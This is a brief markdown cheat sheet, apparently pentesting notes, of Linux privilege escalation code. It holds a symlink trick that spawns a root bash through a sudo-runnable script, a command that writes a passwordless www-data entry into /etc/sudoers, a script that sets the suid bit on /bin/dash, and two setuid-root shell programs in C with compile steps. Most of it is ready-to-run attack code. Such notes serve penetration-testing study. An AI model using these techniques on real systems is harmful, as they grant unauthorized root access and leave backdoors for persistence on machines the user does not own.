# Linux Privilege Escalation Code


## Bash
* If you have access to an executable that is run with higher privileges, here is a quick shell option:

```sh
$ mv /something/something/file.sh{,.bak}        # mv the original .sh file to .bak
$ ln -s /bin/bash /something/something/file.sh  # create a syslink from /bin/bash to a new file
$ sudo /something/something/file.sh
[sudo] password for myuser:
$ id
uid=0(root) gid=0(root) groups=0(root)
```

* Add user to sudoers
```sh
$ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

* Set `suid` flag on executable
```sh
#!/bin/bash
chmod u+s /bin/dash
```
Then as user, run the shell.

## C

* A a SETUID binary that accesses the /bin/sh binary. A SETUID binary is a binary that allows users to execute the binary with the permissions of the executables owner.

```C
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
setuid(0); setgid(0); system("/bin/bash");
}
```
  - Compile:
  ```
  $ gcc -o /tmp/setuid /home/centos/setuid.c
  ```

* Another version of the above
```c
# cat privesc.c
int main(void) {
     setgid(0);
     setuid(0);
     system("/bin/sh");
}
```
